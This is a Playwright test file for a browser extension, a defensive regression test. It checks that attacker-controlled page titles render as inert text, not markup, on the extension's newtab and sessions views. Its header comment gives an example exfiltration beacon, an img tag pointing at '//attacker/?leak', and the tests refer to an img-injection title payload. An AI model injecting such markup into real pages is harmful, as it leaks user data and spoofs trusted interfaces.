// Untrusted-content escaping tests.
//
// Every visited site controls its own document.title, and that title flows into
// innerHTML / d3 .html() sinks on privileged extension pages (the newtab, graph
// and sessions views). The extension-pages CSP (script-src 'self') stops injected
// SCRIPT from running, which is why this class was rated medium rather than high
// — but unescaped markup can still beacon out via <img src=//attacker/?leak> and
// spoof this trusted UI. So the assertion here is deliberately "does an ELEMENT
// materialize", not "does script execute": element-materializes is the property
// the CSP does not cover, and it's what escaping actually fixes.
//
// The payload reaches the extension purely as data — it is set as a fixture
// page's <title> (RCDATA, so it never parses as a tag on the fixture page
// itself) and read back out via the tabs API.

const { test, expect, HOSTILE_TITLE } = require("./fixtures");

const CELL = (title) => `#treemap .cell[aria-label="${title}"]`;

async function openApp(context, server) {
  // A benign tab alongside the hostile one, so the treemap has something to
  // switch away from and we can prove the hostile cell rendered at all.
  for (const slug of ["/alpha", "/hostile"]) {
    const tab = await context.newPage();
    await tab.goto(server + slug, { waitUntil: "load" });
  }

  const nt = await context.newPage();
  await nt.goto("chrome://newtab/", { waitUntil: "domcontentloaded" });
  await expect(nt.locator(CELL("Alpha Page"))).toHaveCount(1);
  return nt;
}

test.describe("untrusted content escaping", () => {
  test("a hostile page title is inert text in the readout, not markup", async ({ context, server }) => {
    const nt = await openApp(context, server);

    // The cell exists at all -> the hostile title survived the tabs API intact
    // and really is attacker-controlled data inside the privileged page.
    const hostileCell = nt.locator(CELL(HOSTILE_TITLE));
    await expect(hostileCell).toHaveCount(1);

    await hostileCell.hover();

    const readoutTitle = nt.locator("#readout .readout-title");

    // The payload renders as literal text...
    await expect(readoutTitle).toHaveText(HOSTILE_TITLE);

    // ...and materializes no element. This is the assertion that fails when the
    // escaping regresses: an unescaped sink turns the payload into a real <img>.
    await expect(readoutTitle.locator("img")).toHaveCount(0);
    await expect(nt.locator("#readout img[src='x']")).toHaveCount(0);
  });

  test("a hostile page title is inert in the sessions view search highlighter", async ({ context, server }) => {
    const nt = await openApp(context, server);

    await nt.locator("a[href='sessions.html']").click();
    await expect(nt).toHaveURL(/.*sessions\.html/);

    // highlightText() builds HTML for innerHTML. Search for a substring of the
    // payload so the hostile title flows through the highlight path specifically,
    // not just the plain-text branch.
    const search = nt.locator("#sessionSearch");
    if (await search.count()) {
      await search.fill("Pwned");
      await nt.waitForTimeout(500);
    }

    await expect(nt.locator("#sessions-container img[src='x']")).toHaveCount(0);
    await expect(nt.locator(".search-highlight img")).toHaveCount(0);
  });
});
